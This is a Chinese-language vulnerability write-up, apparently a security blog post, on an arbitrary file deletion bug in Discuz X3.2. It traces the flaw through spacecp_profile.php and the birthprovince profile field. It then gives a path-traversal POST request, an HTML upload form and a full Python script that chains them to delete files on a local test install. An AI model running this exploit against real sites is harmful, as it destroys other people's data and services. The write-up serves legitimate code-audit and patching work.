---
title: Discuz x 3.2 漏洞分析
tags: [代码审计]
categories: 代码审计
grammar_cjkRuby: true
---

审计最近出来的Discuz 的漏洞
<!-- more -->

# 0x01 爬坑

注册和登录都需要输入验证码吗，但根本没有要输入的地方，而且连图片也没有
第一步就是绕过验证


## 0x1 登录

![][1]
这里需要改一下

## 0x2 注册


![][2]
把第一个true改为false


# 0x02 漏洞定位
首先漏洞的发现过程是循序渐进的,有什么需要做什么都是一步一步来的

下面定位文件删除的漏洞点

可以利用现成的代码审计工具,这里我们利用rips
将代码定位到

source/include/spacecp/spacecp_profile.php

这里有好几处触发点我们一个一个分析其可能性

![][3]



首先提交

![][4]

验证第一个漏洞,这里之所以用profilesubmit和formhash是通过phpstorm动态调试出来的,如下图

![][5]

发现有一个点绕不过去,就是type==file,所以另寻它法

![][6]
这里只需要上传文件成功便可执行删除文件操作,所以这一点比较好绕过


# 0x03 代码回溯
有了删除操作,那么怎么将文件名可控呢,发现文件名为$space[$key]
loadcache会加载$space变量,如果里面有新值那么就可以update信息



![][7]

![][8]

那么在这里直接执行下图数据,就可以修改成任意文件名

![][9]


# 0x04 删除文件
万事具备只欠文件:smile: 下面是删除文件的操作
还记得回溯前的推理吗

只需提交一个文件就可以将现有的文件删除啦
看一下现有的文件路径

![][10]
data/attachment/profile/目录下
只需../../../就可以删除根目录文件了(当然我们可以给文件加上权限)


# 0x05 综合利用
首先利用改文件名,将文件名改为../../../xxx

`home.php?mod=spacecp&ac=profile&op=base`
`POST birthprovince=../../../test.txt&profilesubmit=1&formhash=b7ef819d`

其次利用文件上传将原有文件删除

``` php
<form action="http://127.0.0.1/Discuz/upload/home.php?mod=spacecp&ac=profile&op=base&XDEBUG_SESSION_START=1" method="POST" enctype="multipart/form-data">

<input type="file" name="birthprovince" id="file" />

<input type="text" name="formhash" value="b7ef819d"/></p>

<input type="text" name="profilesubmit" value="1"/></p>

<input type="submit" value="Submit" />

</from>
```

# 0x06 脚本编写

``` python
# coding:utf-8
import requests
from bs4 import BeautifulSoup
res = requests.session()
base = 'http://127.0.0.1/Discuz/upload/'
extend = 'member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes'

data = {
    'username':'action',
    'password':'action'
}

r = res.post(base+extend,data=data)



# get hashvalue
extend = 'home.php?mod=spacecp'
r = res.post(base+extend)
soup = BeautifulSoup(r.content, 'html.parser', from_encoding='utf-8')
strs = soup.find_all('input',attrs={'name':'formhash'})[0]
hashcode = strs['value']
print hashcode

# alter birthprivence

extend = 'home.php?mod=spacecp'
data = {
    'profilesubmit':'1',
    'birthprovince':'../../../1.txt',
    'formhash':hashcode
}
r = res.post(base+extend,data=data)

# delete file named blablabla


extend = 'home.php?mod=spacecp&ac=profile&op=base&XDEBUG_SESSION_START=1'
data = {
    'formhash':hashcode,
    'profilesubmit':'1'
}
files = {
    'birthprovince':('4ct10n.jpg',open('/home/yz/图片/33.png','rb'),"image/jpeg")
}

res.post(base+extend,data=data,files=files)

```


  [1]: ./images/2017-10-21%2014-03-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [2]: ./images/2017-10-21%2014-14-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [3]: ./images/2017-10-21%2021-01-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [4]: ./images/2017-10-21%2021-27-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [5]: ./images/2017-10-21%2021-29-48%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [6]: ./images/2017-10-21%2021-01-54%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [7]: ./images/2017-10-21%2021-39-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [8]: ./images/2017-10-21%2021-42-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [9]: ./images/2017-10-21%2021-45-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
  [10]: ./images/2017-10-21%2021-50-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png
